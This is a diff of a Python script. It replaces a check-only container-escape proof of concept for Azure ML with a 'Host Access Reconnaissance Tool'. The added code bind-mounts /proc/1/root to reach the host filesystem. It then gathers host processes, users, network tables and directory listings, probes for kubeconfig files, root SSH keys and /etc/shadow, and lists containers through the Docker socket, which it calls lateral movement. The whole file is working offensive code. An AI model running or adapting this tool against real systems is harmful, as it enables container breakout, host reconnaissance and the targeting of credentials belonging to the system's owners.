@@ -1,378 +1,281 @@
 #!/usr/bin/env python3
 """
-Safe Container Escape Proof of Concept for Azure ML
----------------------------------------------------
-This script demonstrates container escape techniques WITHOUT actually
-completing the escape or causing any damage. It shows the possibility
-by taking the initial steps and validating the vulnerability exists.
+Improved Host Access Reconnaissance Tool
+-----------------------------------------
+This script attempts container escape using multiple methods,
+validates the results by checking for key host files, and
+tries lateral movement via the Docker socket if available.
 
-SAFE USAGE: This script only demonstrates the vulnerability exists
-without exploiting it or causing any harm.
+CAUTION: Use only in authorized security testing environments.
 """
 
 import os
+import sys
 import subprocess
 import json
-import tempfile
-import uuid
-import sys
 import socket
+import time
 from datetime import datetime
+from pathlib import Path
 
-class SafeContainerEscapePoC:
+class HostRecon:
     def __init__(self):
-        self.results = {
-            "timestamp": datetime.now().isoformat(),
+        self.findings = {
+            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
             "hostname": socket.gethostname(),
-            "escape_vectors": {},
-            "tests_performed": [],
-            "vulnerable": False
+            "host_access_methods": {},
+            "host_system_info": {},
+            "host_processes": {},
+            "host_users": {},
+            "host_network": {},
+            "host_files": {},
+            "security_tools": {},
+            "cloud_environment": {},
+            "credentials": {},
+            "docker_containers": None  # lateral movement info via Docker
         }
-        self.temp_dir = tempfile.mkdtemp()
-        self.evidence_file = os.path.join(self.temp_dir, f"escape_evidence_{uuid.uuid4().hex[:8]}.txt")
-        print(f"Evidence will be saved to: {self.evidence_file}")
+        self.available_escape_methods = []
+        self.host_fs_paths = {}  # store results per method
 
-    def run_command(self, cmd):
-        """Safely execute a command and return result"""
+    def run_command(self, command, timeout=10):
         try:
             result = subprocess.run(
-                cmd, shell=True, check=False,
+                command, shell=True, check=False,
                 stdout=subprocess.PIPE, stderr=subprocess.PIPE,
-                text=True, timeout=10
+                text=True, timeout=timeout
             )
-            return {
-                "returncode": result.returncode,
-                "stdout": result.stdout,
-                "stderr": result.stderr
-            }
+            return result.stdout.strip()
+        except subprocess.TimeoutExpired:
+            return "Command timed out"
         except Exception as e:
-            return {"error": str(e), "returncode": -1}
+            return f"Error: {str(e)}"
 
-    def safe_cgroup_escape_check(self):
-        """
-        Check cgroup escape vector WITHOUT actually escaping
-        This only creates the initial setup to prove it's possible
-        """
-        print("\n[+] Testing cgroup release_agent vector (safely)...")
-        self.results["tests_performed"].append("cgroup_release_agent")
-        
-        # 1. Find a cgroup with notify_on_release enabled
-        cgroups = self.run_command("find /sys/fs/cgroup -name notify_on_release -exec cat {} \\;")
-        if "1" not in cgroups["stdout"]:
-            print("[-] No cgroups found with notify_on_release=1")
-            with open(self.evidence_file, "a") as f:
-                f.write("\n--- CGROUP ESCAPE CHECK ---\n")
-                f.write("No cgroups found with notify_on_release=1\n")
-            return False
-        
-        # 2. Find a writable release_agent file
-        release_agents = self.run_command("find /sys/fs/cgroup -name release_agent")
-        if not release_agents["stdout"]:
-            print("[-] No release_agent files found")
-            return False
-        
-        vulnerable = False
-        victim_cgroup = None
-        
-        # Check each release_agent for writability
-        for line in release_agents["stdout"].splitlines():
-            path = line.strip()
-            if not path:
-                continue
-            
-            if os.access(path, os.W_OK):
-                vulnerable = True
-                print(f"[!] Found writable release_agent: {path}")
-                
-                # Try to find parent cgroup directory
-                cgroup_dir = os.path.dirname(path)
-                if os.access(cgroup_dir, os.W_OK):
-                    victim_cgroup = cgroup_dir
-                    print(f"[!] Parent cgroup directory is writable: {cgroup_dir}")
-                    break
-        
-        # Record findings
-        self.results["escape_vectors"]["cgroup"] = {
-            "vulnerable": vulnerable,
-            "writable_release_agent": vulnerable,
-            "writable_cgroup_dir": victim_cgroup is not None
-        }
-        
-        with open(self.evidence_file, "a") as f:
-            f.write("\n--- CGROUP ESCAPE CHECK ---\n")
-            f.write(f"Vulnerable: {vulnerable}\n")
-            if vulnerable:
-                f.write(f"Writable release_agent found\n")
-                if victim_cgroup:
-                    f.write(f"Writable parent cgroup: {victim_cgroup}\n")
-        
-        # Since we are just demonstrating and not exploiting, we'll stop here
-        if vulnerable:
-            print("[!] VULNERABLE: Container could escape via cgroup release_agent")
-            print("[+] Escape technique demonstrated without exploitation:")
-            print("    1. Create a subfolder in the cgroup")
-            print("    2. Write a command to the release_agent file")
-            print("    3. Writing to notify_on_release triggers command on host")
-            print("    *NOT PERFORMED: Actual command execution on host*")
-            self.results["vulnerable"] = True
-        
-        return vulnerable
+    def find_escape_methods(self):
+        print("[+] Identifying available escape methods...")
+        escape_methods = {}
 
-    def safe_privileged_device_check(self):
-        """
-        Check for escape via privileged devices WITHOUT exploitation
-        Shows the potential for escape without causing harm
-        """
-        print("\n[+] Testing privileged device access (safely)...")
-        self.results["tests_performed"].append("privileged_devices")
-        
-        # Check access to device memory
-        mem_writable = os.access("/dev/mem", os.W_OK)
-        kcore_readable = os.access("/proc/kcore", os.R_OK)
-        kernel_writable = os.access("/sys/kernel", os.W_OK)
-        
-        # Check for arbitrary module loading capability
-        can_load_modules = False
-        modules_check = self.run_command("ls -la /lib/modules/$(uname -r)/kernel 2>/dev/null")
-        if modules_check["returncode"] == 0:
-            # Check if we can create a file in /tmp to simulate module creation
-            mod_check = self.run_command("touch /tmp/test_module.ko && rm /tmp/test_module.ko")
-            can_load_modules = mod_check["returncode"] == 0
-        
-        # Record findings
-        self.results["escape_vectors"]["privileged_devices"] = {
-            "vulnerable": mem_writable or kcore_readable or kernel_writable,
-            "mem_writable": mem_writable,
-            "kcore_readable": kcore_readable,
-            "kernel_writable": kernel_writable,
-            "can_load_modules": can_load_modules
-        }
-        
-        with open(self.evidence_file, "a") as f:
-            f.write("\n--- PRIVILEGED DEVICE CHECK ---\n")
-            f.write(f"/dev/mem writable: {mem_writable}\n")
-            f.write(f"/proc/kcore readable: {kcore_readable}\n")
-            f.write(f"/sys/kernel writable: {kernel_writable}\n")
-            f.write(f"Can potentially load kernel modules: {can_load_modules}\n")
-        
-        # If vulnerable, show the implications without actual exploitation
-        if mem_writable or kcore_readable or kernel_writable:
-            print("[!] VULNERABLE: Container has privileged device access")
-            print("    - Direct memory access allows escape through kernel memory manipulation")
-            if mem_writable:
-                print(f"    - /dev/mem is writable (direct physical memory access)")
-            if kcore_readable:
-                print(f"    - /proc/kcore is readable (kernel memory image)")
-            if kernel_writable:
-                print(f"    - /sys/kernel is writable (kernel parameters)")
-            if can_load_modules:
-                print(f"    - Kernel module loading appears possible")
-            print("    *NOT PERFORMED: Actual kernel memory manipulation*")
-            self.results["vulnerable"] = True
-            return True
-        
-        print("[-] Container does not have privileged device access")
-        return False
+        # Method 1: /proc/1/root access
+        host_proc_accessible = os.access("/proc/1/root", os.R_OK)
+        escape_methods["proc_1_root_access"] = host_proc_accessible
 
-    def safe_mount_escape_check(self):
-        """
-        Check for potential host mount escape WITHOUT exploitation
-        Shows if the container has potentially dangerous mounts
-        """
-        print("\n[+] Testing host mount access (safely)...")
-        self.results["tests_performed"].append("host_mounts")
-        
-        # Check for suspicious mounts
-        mounts = self.run_command("mount")
-        
-        # Look for suspicious mount patterns
-        suspicious_mounts = []
-        for line in mounts["stdout"].splitlines():
-            if any(pattern in line for pattern in [
-                "docker.sock", "/docker", ":/host", "/host:", 
-                "hostPath", "/var/run/docker", "/proc/", "/sys/"
-            ]):
-                suspicious_mounts.append(line)
-        
-        # Check for host root filesystem access
-        proc_host_check = self.run_command("ls -la /proc/1/root/ 2>/dev/null | head -n 5")
-        root_readable = proc_host_check["returncode"] == 0 and proc_host_check["stdout"] and "Permission denied" not in proc_host_check["stderr"]
-        
-        # Check for docker socket
-        docker_sock = os.path.exists("/var/run/docker.sock") or os.path.exists("/run/docker.sock")
-        
-        # Record findings
-        self.results["escape_vectors"]["mounts"] = {
-            "vulnerable": len(suspicious_mounts) > 0 or root_readable or docker_sock,
-            "suspicious_mounts": suspicious_mounts,
-            "proc1_root_readable": root_readable,
-            "docker_socket_present": docker_sock
-        }
-        
-        with open(self.evidence_file, "a") as f:
-            f.write("\n--- HOST MOUNT CHECK ---\n")
-            f.write(f"Suspicious mounts found: {len(suspicious_mounts)}\n")
-            for mount in suspicious_mounts:
-                f.write(f"  {mount}\n")
-            f.write(f"PID 1 root readable: {root_readable}\n")
-            f.write(f"Docker socket present: {docker_sock}\n")
-        
-        # Demonstrate implications without exploiting
-        if suspicious_mounts or root_readable or docker_sock:
-            print("[!] VULNERABLE: Container has suspicious mounts or host access")
-            if suspicious_mounts:
-                print(f"    - Found {len(suspicious_mounts)} suspicious mount points")
-                for i, mount in enumerate(suspicious_mounts[:3]):
-                    print(f"      {mount[:80]}...")
-                if len(suspicious_mounts) > 3:
-                    print(f"      (and {len(suspicious_mounts)-3} more)")
-            
-            if root_readable:
-                print("    - Can access host's root filesystem through /proc/1/root")
-                print("    - This allows reading host files and potential credential theft")
-            
-            if docker_sock:
-                print("    - Docker socket is accessible from container")
-                print("    - This allows creating privileged containers for escape")
-            
-            print("    *NOT PERFORMED: Actual host filesystem access or exploitation*")
-            self.results["vulnerable"] = True
-            return True
-        
-        print("[-] No suspicious host mounts detected")
-        return False
+        # Method 2: Check CAP_SYS_ADMIN capability
+        cap_sys_admin = "cap_sys_admin" in self.run_command("capsh --print").lower()
+        escape_methods["cap_sys_admin"] = cap_sys_admin
 
-    def safe_capabilities_check(self):
-        """
-        Check for dangerous capabilities WITHOUT exploitation
-        """
-        print("\n[+] Testing for dangerous capabilities (safely)...")
-        self.results["tests_performed"].append("dangerous_capabilities")
-        
-        # Check capabilities
-        cap_check = self.run_command("capsh --print || grep Cap /proc/self/status")
-        
-        # Look for dangerous capabilities
-        dangerous_caps = []
-        cap_output = cap_check["stdout"]
-        
-        if "=ep" in cap_output:
-            dangerous_caps.append("CAP_ALL (=ep)")
+        # Method 3: Check if we can mount filesystems (for a bind mount)
+        can_mount = os.access("/dev", os.W_OK) and cap_sys_admin
+        escape_methods["can_mount_filesystems"] = can_mount
+
+        # Method 4: Check for Docker socket (for lateral movement)
+        docker_socket_access = os.path.exists("/var/run/docker.sock") and os.access("/var/run/docker.sock", os.R_OK)
+        escape_methods["docker_socket_access"] = docker_socket_access
+
+        # Save available methods
+        self.findings["host_access_methods"] = escape_methods
+        if escape_methods.get("proc_1_root_access"):
+            self.available_escape_methods.append("proc_1_root")
+        if docker_socket_access:
+            self.available_escape_methods.append("docker_socket")
+        if can_mount:
+            self.available_escape_methods.append("bind_mount")
+
+        print(f"[+] Available escape methods: {self.available_escape_methods}")
+        return len(self.available_escape_methods) > 0
+
+    def attempt_escape_method(self, method):
+        host_fs_path = None
+        if method == "proc_1_root":
+            print("[*] Attempting /proc/1/root access...")
+            host_fs_path = "/proc/1/root"
+        elif method == "bind_mount":
+            print("[*] Attempting bind mount using /proc/1/root...")
+            mount_point = "/tmp/host_root_bind"
+            os.makedirs(mount_point, exist_ok=True)
+            # Use bind mount to mirror the host filesystem from /proc/1/root
+            mount_cmd = f"mount --bind /proc/1/root {mount_point}"
+            mount_result = self.run_command(mount_cmd)
+            if "Error" in mount_result or "failed" in mount_result.lower():
+                print(f"[-] Bind mount failed: {mount_result}")
+            else:
+                host_fs_path = mount_point
+        elif method == "docker_socket":
+            print("[*] Docker socket detected. Attempting lateral movement...")
+            docker_ps = self.run_command("docker ps -a")
+            self.findings["docker_containers"] = docker_ps
+            print("[+] Docker containers list:")
+            print(docker_ps)
+            # No host_fs_path for docker lateral movement
         else:
-            for cap in ["cap_sys_admin", "cap_sys_ptrace", "cap_sys_module", 
-                        "cap_net_admin", "cap_sys_rawio", "cap_dac_override"]:
-                if cap.lower() in cap_output.lower():
-                    dangerous_caps.append(cap)
-        
-        # Check for potential namespace escape
-        ns_check = self.run_command("ls -la /proc/1/ns/ 2>/dev/null")
-        
-        # Record findings
-        self.results["escape_vectors"]["capabilities"] = {
-            "vulnerable": len(dangerous_caps) > 0,
-            "dangerous_capabilities": dangerous_caps,
-            "capabilities_output": cap_output[:500]  # Limit output size
-        }
-        
-        with open(self.evidence_file, "a") as f:
-            f.write("\n--- CAPABILITIES CHECK ---\n")
-            f.write(f"Dangerous capabilities found: {len(dangerous_caps)}\n")
-            for cap in dangerous_caps:
-                f.write(f"  {cap}\n")
-            f.write(f"Raw capabilities output:\n{cap_output[:1000]}\n")
-        
-        # Demonstrate implications without exploiting
-        if dangerous_caps:
-            print("[!] VULNERABLE: Container has dangerous capabilities")
-            print(f"    - Found {len(dangerous_caps)} dangerous capabilities:")
-            for cap in dangerous_caps:
-                print(f"      {cap}")
-            
-            if "CAP_ALL (=ep)" in dangerous_caps or "cap_sys_admin" in [c.lower() for c in dangerous_caps]:
-                print("    - CAP_SYS_ADMIN or full capabilities grant almost complete host access")
-                print("    - This allows mounting filesystems, accessing host namespaces, etc.")
-            
-            print("    *NOT PERFORMED: Actual capability exploitation*")
-            self.results["vulnerable"] = True
-            return True
-        
-        print("[-] No dangerous capabilities detected")
+            print(f"[-] Unknown escape method: {method}")
+
+        if host_fs_path and os.path.exists(host_fs_path) and os.access(host_fs_path, os.R_OK):
+            # Validate that key host files exist (e.g., /etc/os-release)
+            test_file = os.path.join(host_fs_path, "etc/os-release")
+            if os.path.exists(test_file) and os.access(test_file, os.R_OK):
+                print(f"[+] Host filesystem validated at {host_fs_path} using method '{method}'")
+                self.host_fs_paths[method] = host_fs_path
+                return True
+            else:
+                print(f"[-] Validation failed for {host_fs_path} (missing key host files)")
+        else:
+            if method != "docker_socket":
+                print(f"[-] Method '{method}' did not yield host filesystem access.")
         return False
 
-    def run_all_checks(self):
-        """Run all safe PoC checks"""
-        print("=== Safe Container Escape Proof of Concept ===")
-        print("Testing for escape vectors WITHOUT exploitation...")
-        print("This will demonstrate vulnerabilities without causing harm.")
-        
-        # Create evidence file
-        with open(self.evidence_file, "w") as f:
-            f.write(f"CONTAINER ESCAPE PROOF OF CONCEPT\n")
-            f.write(f"Timestamp: {self.results['timestamp']}\n")
-            f.write(f"Hostname: {self.results['hostname']}\n")
-            f.write(f"Purpose: Safe demonstration of container escape vectors\n")
-            f.write(f"Note: No actual escape performed\n")
-        
-        # Run all checks
-        cgroup_vuln = self.safe_cgroup_escape_check()
-        device_vuln = self.safe_privileged_device_check()
-        mount_vuln = self.safe_mount_escape_check()
-        cap_vuln = self.safe_capabilities_check()
-        
-        # Summarize findings
-        print("\n=== RESULTS SUMMARY ===")
-        print(f"Container Escape Vectors Identified: {self.results['vulnerable']}")
-        
-        if self.results["vulnerable"]:
-            print("\nVulnerable to escape via:")
-            if cgroup_vuln:
-                print("- Cgroup release_agent manipulation")
-            if device_vuln:
-                print("- Privileged device access")
-            if mount_vuln:
-                print("- Host filesystem access through mounts")
-            if cap_vuln:
-                print("- Dangerous capabilities")
-            
-            print("\nIMPLICATIONS:")
-            print("This container configuration could allow a malicious actor to:")
-            print("1. Break out of the container boundary")
-            print("2. Access the underlying host system")
-            print("3. Potentially access sensitive data or credentials")
-            print("4. Potentially compromise other containers on the same host")
-        else:
-            print("No obvious container escape vectors identified.")
-        
-        print(f"\nDetailed evidence saved to: {self.evidence_file}")
-        print("\nREMINDER: This proof of concept only demonstrated the potential")
-        print("vulnerabilities WITHOUT actually exploiting them or causing harm.")
-        
-        # Save final results to JSON
-        results_json = os.path.join(self.temp_dir, "escape_results.json")
-        with open(results_json, "w") as f:
-            json.dump(self.results, f, indent=2)
-        
-        print(f"Results also saved to: {results_json}")
-        return self.results
+    def gather_host_system_info(self, host_path):
+        print(f"[+] Gathering host system information from {host_path}...")
+        os_release = self.run_command(f"cat {host_path}/etc/os-release")
+        hostname = self.run_command(f"cat {host_path}/etc/hostname")
+        kernel = self.run_command(f"cat {host_path}/proc/version")
+        self.findings["host_system_info"] = {
+            "hostname": hostname,
+            "os_release": os_release,
+            "kernel": kernel,
+            "uptime": self.run_command(f"cat {host_path}/proc/uptime"),
+            "loaded_modules": self.run_command(f"ls -la {host_path}/proc/1/maps | head -10")
+        }
+        # Also list a few key directories for additional context
+        for dir_path in ["/etc", "/var/log", "/root", "/home"]:
+            full_path = f"{host_path}{dir_path}"
+            if os.path.exists(full_path):
+                listing = self.run_command(f"ls -la {full_path} | head -10")
+                self.findings["host_system_info"][f"{dir_path}_listing"] = listing
 
-def main():
-    print("\n⚠️  WARNING: This script will safely demonstrate container escape vectors.")
-    print("It will NOT actually perform an escape or cause any system harm.\n")
-    
-    try:
-        # Run as root is ideal for complete check
-        if os.geteuid() != 0:
-            print("Note: Running without root privileges. Some checks may be limited.")
-        
-        # Run the safe proof of concept
-        poc = SafeContainerEscapePoC()
-        results = poc.run_all_checks()
-        return 0
-    except Exception as e:
-        print(f"Error during proof of concept: {str(e)}")
-        import traceback
-        traceback.print_exc()
-        return 1
+    def gather_host_processes(self, host_path):
+        print(f"[+] Gathering host process information from {host_path}...")
+        processes = {}
+        proc_dir = f"{host_path}/proc"
+        if os.path.exists(proc_dir) and os.access(proc_dir, os.R_OK):
+            for pid in os.listdir(proc_dir):
+                if pid.isdigit():
+                    cmd_file = f"{proc_dir}/{pid}/cmdline"
+                    if os.path.exists(cmd_file) and os.access(cmd_file, os.R_OK):
+                        with open(cmd_file, 'r') as f:
+                            cmd = f.read().replace('\0', ' ').strip()
+                            if cmd:
+                                processes[pid] = {"command": cmd}
+        self.findings["host_processes"] = {
+            "process_count": len(processes),
+            "processes": processes
+        }
+
+    def gather_host_users(self, host_path):
+        print(f"[+] Gathering host user information from {host_path}...")
+        users = {}
+        passwd_file = f"{host_path}/etc/passwd"
+        if os.path.exists(passwd_file) and os.access(passwd_file, os.R_OK):
+            with open(passwd_file, 'r') as f:
+                for line in f.read().splitlines():
+                    if line and not line.startswith('#'):
+                        parts = line.split(':')
+                        if len(parts) >= 7:
+                            username, uid, gid, _, home, shell = parts[0], parts[2], parts[3], parts[4], parts[5], parts[6]
+                            users[username] = {"uid": uid, "gid": gid, "home": home, "shell": shell}
+        self.findings["host_users"] = {"users": users}
+
+    def gather_host_network(self, host_path):
+        print(f"[+] Gathering host network information from {host_path}...")
+        net_info = {}
+        for fname in ["dev", "route", "arp"]:
+            file_path = f"{host_path}/proc/net/{fname}"
+            if os.path.exists(file_path) and os.access(file_path, os.R_OK):
+                with open(file_path, 'r') as f:
+                    net_info[fname] = f.read()
+            else:
+                net_info[fname] = f"Could not access {fname}"
+        self.findings["host_network"] = net_info
+
+    def find_sensitive_files(self, host_path):
+        print(f"[+] Searching for sensitive files in {host_path}...")
+        sensitive_files = {
+            "kubernetes_config": ["/etc/kubernetes/admin.conf", "/root/.kube/config"],
+            "ssh_keys": ["/root/.ssh/id_rsa"]
+        }
+        found = {}
+        for category, files in sensitive_files.items():
+            found[category] = {}
+            for file in files:
+                full_path = f"{host_path}{file}"
+                if os.path.exists(full_path) and os.access(full_path, os.R_OK):
+                    found[category][file] = "Found and readable"
+        self.findings["host_files"] = found
+
+    def check_for_security_tools(self, host_path):
+        print(f"[+] Checking for security tools in {host_path}...")
+        # For brevity, just check if a couple of common directories exist
+        tools_found = {}
+        for directory in ["/etc/selinux", "/etc/apparmor.d"]:
+            full_path = f"{host_path}{directory}"
+            if os.path.exists(full_path):
+                tools_found[directory] = "Indicator present"
+        self.findings["security_tools"] = tools_found
+
+    def check_for_cloud_environment(self, host_path):
+        print(f"[+] Checking for cloud environment indicators in {host_path}...")
+        indicators = {"aws": [], "gcp": [], "azure": []}
+        # Example: check for /etc/cloud/cloud.cfg
+        if os.path.exists(f"{host_path}/etc/cloud/cloud.cfg"):
+            indicators["aws"].append("/etc/cloud/cloud.cfg")
+        self.findings["cloud_environment"] = {"cloud_indicators": indicators}
+
+    def find_credentials(self, host_path):
+        print(f"[+] Looking for credentials in {host_path}...")
+        creds = {}
+        for file in ["/etc/passwd", "/etc/shadow"]:
+            full_path = f"{host_path}{file}"
+            if os.path.exists(full_path) and os.access(full_path, os.R_OK):
+                creds[file] = "Found"
+        self.findings["credentials"] = creds
+
+    def save_findings(self):
+        print("\n===== FULL RECONNAISSANCE FINDINGS =====")
+        print(json.dumps(self.findings, indent=2))
+
+    def print_summary(self):
+        print("\n=== HOST RECONNAISSANCE SUMMARY ===")
+        if self.host_fs_paths:
+            for method, path in self.host_fs_paths.items():
+                print(f"[+] Host filesystem (via {method}) accessed at: {path}")
+        if "host_system_info" in self.findings:
+            info = self.findings["host_system_info"]
+            print(f"[+] OS Info: {info.get('os_release', 'N/A')}")
+            print(f"[+] Kernel: {info.get('kernel', 'N/A')}")
+        if self.findings.get("docker_containers"):
+            print("[+] Docker lateral movement yielded container information.")
+        print("=============================================")
+
+    def run(self):
+        print("==== Improved Host Access Reconnaissance Tool ====")
+        print(f"Started at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+        print(f"Hostname: {socket.gethostname()}")
+        print("=============================================")
+
+        if not self.find_escape_methods():
+            print("[-] No escape methods available.")
+            return
+
+        # Iterate over available methods
+        for method in self.available_escape_methods:
+            print(f"\n[***] Attempting escape using method: {method}")
+            success = self.attempt_escape_method(method)
+            if success:
+                host_path = self.host_fs_paths.get(method)
+                # Gather additional information if host filesystem is validated
+                self.gather_host_system_info(host_path)
+                self.gather_host_processes(host_path)
+                self.gather_host_users(host_path)
+                self.gather_host_network(host_path)
+                self.find_sensitive_files(host_path)
+                self.check_for_security_tools(host_path)
+                self.check_for_cloud_environment(host_path)
+                self.find_credentials(host_path)
+            elif method == "docker_socket":
+                # Docker method for lateral movement
+                pass
+
+        self.save_findings()
+        self.print_summary()
 
 if __name__ == "__main__":
-    sys.exit(main())
+    recon = HostRecon()
+    recon.run()
